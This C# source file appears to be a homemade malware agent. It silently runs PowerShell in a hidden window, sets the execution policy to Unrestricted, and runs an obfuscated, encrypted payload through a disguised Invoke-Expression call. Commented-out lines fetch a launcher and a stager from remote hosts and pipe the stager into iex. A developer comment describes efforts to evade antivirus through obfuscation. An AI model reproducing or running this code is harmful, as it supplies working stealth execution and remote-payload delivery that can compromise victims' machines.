using System.Diagnostics;

namespace EmbeddedAgent
{
    internal class AgentProcess
    {
        public static void ExecuteCommands(List<string> commands)
        {
            ProcessStartInfo psi = new ProcessStartInfo();

            psi.CreateNoWindow = true;
            psi.FileName = "powershell.exe";
            psi.WindowStyle = ProcessWindowStyle.Hidden;

            psi.ArgumentList.Add("-Command");

            commands.ForEach(command =>
            {
                psi.ArgumentList.Add(command + ";");
            });

            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;
            psi.CreateNoWindow = true;

            Process process = new Process();

            process.StartInfo = psi;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();

            process.WaitForExit();
            Console.WriteLine(output);
        }

        public static bool CheckIfLauncherIsAlreadyInstalled()
        {
            return File.Exists(Path.Combine(Directory.GetCurrentDirectory(), "launcher.bat"));
        }

        /*
        * IDEAS:
        * -------
        *I have to figure out why now the av doesn't let me disable it and run my command
        *Watch hackersploit for obfuscation of my powershell command
        *Also try to return to the previous snapshot, to really recreate a real environnement where I would be interacting with the machine for the first time
        */
        public static List<string> InitCommands()
        {

            //if (!CheckIfLauncherIsAlreadyInstalled())
            //  commands.Add("Invoke-WebRequest http://192.168.76.131/launcher.bat -OutFile launcher.bat");
            return new List<string>
            {
                $"cd $env:tmp",
                "Set-ExecutionPolicy Unrestricted",
               // "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.76.128:4444/download/powershell/Om1hdHRpZmVzdGF0aW9uIGV0dw==') -UseBasicParsing|iex",
                "( [RuNTiMe.iNtERoPSeRvIceS.mArShAl]::PTRtosTrINgbsTR([rUntIME.inTERopSeRVICES.MARshAL]::sECurEStrINGTobsTr($('76492d1116743f0423413b16050a5345MgB8AGYAcQBBAHQAZwBJAG0ARwByAEEARwBLAHIAeQAxAFkATABDAFYAOQBKAGcAPQA9AHwAZABmAGMAMwBmAGIANwA3AGIAOAAxADEAZQAxAGYANwA4ADkANAAyAGIAYQAzAGYAZgA2ADAANABjADEAMgA1AGMAZgAyADMAYgBiADgANgA2ADAAMgA5ADkAZAA5AGEAYwBkADMAYQA3ADYANQA1ADIAMgAyADIAMwAyAGEAYwA4ADAAMAAxAGEAMwBlAGQAMwA4AGYAMQAyADcAZQAyADUAYwA2ADkAZAAzADMAYgA4AGYAYQA0AGQAYQA3ADgAZgA3AGQAZAAwADcAMABjAGIAOAAzAGIAMwBmAGQAOABlADcAZgA3ADUAYgBhADIANgA3ADMANwAzADQANAA1AGMANgBmADEANAAxADgANQAzAGEANwAyADIAZAA0ADIANAA4AGYAYQBjADMANgBjAGIAYQBhADQAZQAwADMAZAAwAGIAYQBiAGIAZgAxADYAYgBhADkAMgA0AGEAZQBhADMAYQBjADEAOQA0AGQAZgAxADEAZAA5ADYANwAzADQANABiADUANwAzADAAMgA1AGMANgAzAGQAYwA5ADcANQAxADAAOABhADcAOABkADgAYQA0ADMAZAA0ADYAMwAyADYAOQBjADUAOQA4AGIAZQBjAGIAMgBhAGIAOQBjADAANQA0ADIAYwAwADgAZAAyADEAMQAzAGUAMgA2AGQAOQAxADIAZgA3AGUANABjADAAYgBhADgAZQBiAGMAZAAzADMAYQAyADQAZQA4ADAAZAAyADYAMABkADYAYwBmADAAYwA4AGUANAA1ADgAOQAwADgAMAA3AGEAYwAwAGIANABhAGQANAA5AGIANQAxADQAZgA3ADgAOQBhAGUAZQBmAGUAYgAzADcAMAAxAGQANwA4ADMAOQA0ADQAZgBiADUAYgAzADgAMQA5ADkANAAwAGMAYQBlAGUAYQAxADUAMQA4ADgAYQA2ADMAYwAzAGUAOAA0ADIAYwBhADQAYwBhADUAYQA3AGQAOABjADMANAA0ADgAOAAyADYAZAA1ADcAMwAzAGYAMgBlADgAZgA2AGUAMgAzADQAOQA2AGUAOQBhAGQANwAyADMANAA0ADcAYgBmADkAZgBiADEAMQBiADAAMgA0ADgAMQAzAGMANgBmADQAZQA5AGIAYwBlADUANwA1ADEANQAwADMAMQA3ADQAYgBmADYAMgA0AGEAYQA4ADMANQAwADIAMABkADEAYwA0ADQANABmADkAZAAzAGQANQA4AGUAYwBlAGUAZQA2AGUAOQBjADIANwAxADkAZABlADgAYgBmADUANQBlADQAMwA2ADUAOQBkADYAZABhADgAYQBkADkANQA5AGUAZAAzAGUAZAAxAGQAYgAwAGYANwAzADgAZQA1ADMAOQAyAGUAYwAzADQAOAAwADEAOAAwAGEANQAzAGQAOQA5ADIAMQBlADUAYQAxADUAYQAxADYAYQBkAGEAZQBhAGIANgBhADMAOABiAGYAMgBkADMAZgBlAGEAZABiADkANwA2AGUAYwAzADMAZAAyAGUANQA4ADUANQA1ADkAYwBjAGUAZABiAGYAZgA5AGIANAA2ADQAMgBkADMAZAA4ADEAMQA0ADgAMwA3ADcAYwBlADcAYQA4ADAAZQA0AGUAMQBkADEAZgBkADEANgAzADkAYQBmAGYAOQBkADYANQA5ADkAMQA2ADQAMgA4AGQAZQBiAGEAYQBhAGEAOQA3ADUAMAA1ADYAZgBjADkAMgBiADIAOQAyADUAMQA3ADAAMgBlADMANQBlAGQAZABkADMANwBjAGEAYQBhADAAMgA3ADIAOQBlADEAMQBkADEAMQAyADMANwBhADkAYgAyAGUAMgA1ADIAYgAyADEANwBiAGIANgAwADcAOQA4ADQAMgAxAGMAYQBmADEAMAA3AGQAMAAxADIANQA0ADkANwAxADQAMQBkADQANQBhADUAZQBiAGYAMABlADUAZQBkADcANQAwAGYANgBmAGUAMQAzADYAYQA0AGUAMwA3ADcANAA2ADMANQBmAGQAMwA4ADUANgA5AGIANgBkADMAMwA4AGIANAA4AGIAMwBlADQAZAA4AGIAYwA5ADEANwBjADcAZABmADYAZQA3AGQAOQBhAA==' | CoNvERtto-sECuresTrIng  -keY (39..54)) ))) |&( $PSHoMe[21]+$PsHOme[30]+'X')"

            }; ;
        }

    }
}
